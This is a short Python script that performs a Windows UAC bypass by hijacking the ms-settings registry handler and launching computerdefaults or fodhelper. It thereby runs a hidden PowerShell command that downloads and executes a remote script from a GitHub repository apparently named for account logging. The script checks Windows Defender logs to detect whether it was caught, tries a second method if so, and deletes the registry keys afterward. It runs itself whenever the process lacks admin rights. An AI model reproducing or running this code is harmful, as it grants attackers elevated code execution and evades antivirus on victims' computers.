import subprocess
import ctypes
import sys
import os

def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
        # Lệnh PowerShell cần chạy
        powershell_command = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex"'
        
        if method == 1:
            execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{powershell_command}" /f')
            execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{powershell_command}" /f')
            execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        
        return True

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

if not IsAdmin():
    UACbypass()
